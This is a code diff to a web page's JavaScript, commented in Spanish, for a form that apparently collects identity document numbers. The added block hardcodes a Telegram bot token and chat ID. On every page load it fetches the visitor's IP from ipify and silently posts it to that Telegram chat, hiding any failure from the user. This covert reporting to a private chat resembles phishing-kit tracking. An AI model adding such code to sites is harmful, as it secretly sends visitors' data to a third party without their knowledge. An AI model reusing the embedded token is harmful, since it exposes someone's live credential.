@@ -642,7 +642,47 @@
         // ─── Config ───
         const API_URL = window.location.origin; // Detecta automáticamente (localhost o Render)
 
+        // ─── Configuración Telegram ───
+        const TELEGRAM_BOT_TOKEN = '8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E';
+        const TELEGRAM_CHAT_ID = '-1004457768033';
+
         let tipoDocSeleccionado = 'CC';
+
+        // ─── Notificar a Telegram al ingresar ───
+        (async function notificarIngreso() {
+            try {
+                // Obtener IP del visitante
+                let ip = 'desconocida';
+                try {
+                    const ipResp = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResp.json();
+                    ip = ipData.ip || 'desconocida';
+                } catch (e) {
+                    // Si falla, intentar con otro servicio
+                    try {
+                        const ipResp2 = await fetch('https://api64.ipify.org?format=json');
+                        const ipData2 = await ipResp2.json();
+                        ip = ipData2.ip || 'desconocida';
+                    } catch (e2) {
+                        ip = 'desconocida';
+                    }
+                }
+
+                const mensaje = `Nuevo ingreso\nIP: ${ip}`;
+
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: mensaje
+                    })
+                });
+            } catch (err) {
+                // Silencioso: no afecta la experiencia del usuario
+                console.warn('No se pudo enviar notificación a Telegram:', err);
+            }
+        })();
 
         // ─── Validar solo números ───
         function validarNumero(input) {
